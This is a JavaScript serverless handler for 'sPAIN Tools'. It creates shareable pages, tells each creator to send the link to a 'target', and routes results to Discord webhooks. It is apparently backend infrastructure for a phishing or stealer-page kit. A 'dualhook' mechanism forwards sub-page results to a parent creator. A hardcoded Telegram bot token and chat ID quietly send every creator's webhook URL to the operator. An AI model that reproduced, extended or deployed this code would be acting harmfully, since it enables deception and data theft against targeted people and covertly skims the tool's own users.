// api/claim.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

async function redisSet(key, value) {
  const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
    body: JSON.stringify({ value: JSON.stringify(value) })
  });
  return res.ok;
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

async function notifyCreatorWebhook(webhookUrl, url, slug, displayName, type) {
  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'sPAIN Tools',
        embeds: [{
          title: `✅ Your ${type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page is ready!`,
          description: `Your page has been created successfully.\n\n**Share this link with your target:**\n${url}`,
          color: type === 'dualhook' ? 0x06b6d4 : 0xc026d3,
          fields: [
            { name: '📁 Slug', value: `\`${slug}\``, inline: true },
            { name: '🏷 Display Name', value: displayName || slug, inline: true },
            { name: '🔗 Your Link', value: url, inline: false }
          ],
          footer: { text: 'sPAIN Tools — Keep this webhook private!' },
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  // dualhookParent = slug of the dualhook page that spawned this (only set for sub-pages)
  const { name, displayName, webhook, inviteUrl, charUrl, type, dualhookParent } = body || {};

  if (!name)    return res.status(400).json({ error: 'name is required' });
  if (!webhook) return res.status(400).json({ error: 'webhook is required' });

  const slug = name.trim().toLowerCase().replace(/\s+/g, '-');

  if (!/^[a-z0-9_-]+$/i.test(slug)) {
    return res.status(400).json({ error: 'Name can only contain letters, numbers, hyphens, underscores' });
  }

  const RESERVED = ['api', 'index', 'favicon', 'robots', 'sitemap', '_next', 'static'];
  if (RESERVED.includes(slug)) {
    return res.status(400).json({ error: 'That name is reserved' });
  }

  try {
    const existing = await redisGet(`slot:${slug}`);
    if (existing !== null) {
      return res.status(200).json({ taken: true });
    }

    // ── If this page was generated from a dualhook parent, store the parent's webhook ──
    let parentWebhook = null;
    if (dualhookParent) {
      const parentRecord = await redisGet(`slot:${dualhookParent}`);
      if (parentRecord && parentRecord.type === 'dualhook') {
        parentWebhook = parentRecord.webhook;
      }
    }

    const record = {
      slug,
      displayName: displayName || slug,
      webhook,                          // this page creator's own webhook
      parentWebhook: parentWebhook || null,  // dualhook creator's webhook (receives copies)
      inviteUrl:  inviteUrl  || '',
      charUrl:    charUrl    || '',
      type:       type === 'dualhook' ? 'dualhook' : 'slots',
      createdAt:  new Date().toISOString()
    };

    const ok = await redisSet(`slot:${slug}`, record);
    if (!ok) return res.status(500).json({ error: 'Failed to save' });

    const url = `https://spain-tools.vercel.app/${slug}`;

    // Notify creator's webhook
    await notifyCreatorWebhook(webhook, url, slug, record.displayName, record.type);

    // Also notify dualhook parent webhook that a sub-page was just generated
    if (parentWebhook && parentWebhook !== webhook) {
      await notifyCreatorWebhook(parentWebhook, url, slug,
        `[Sub-page of your Dualhook] ${record.displayName}`, 'slots');
    }

    // Telegram log
    const tgMsg = [
      `🆕 <b>New ${record.type === 'dualhook' ? 'Dualhook' : 'Slots 1–9'} page claimed!</b>`,
      `📁 Slug: <code>${slug}</code>`,
      `🏷 Display: ${record.displayName}`,
      `🔗 URL: ${url}`,
      `📡 Webhook: <code>${webhook}</code>`,
      parentWebhook ? `🔀 Parent Webhook (dualhook): <code>${parentWebhook}</code>` : '',
      inviteUrl ? `💬 Invite: ${inviteUrl}` : '',
      `🕐 ${record.createdAt}`
    ].filter(Boolean).join('\n');

    await tgSend(tgMsg);

    return res.status(200).json({ success: true, url, slug });

  } catch (err) {
    return res.status(500).json({ error: 'Server error', detail: err.message });
  }
}
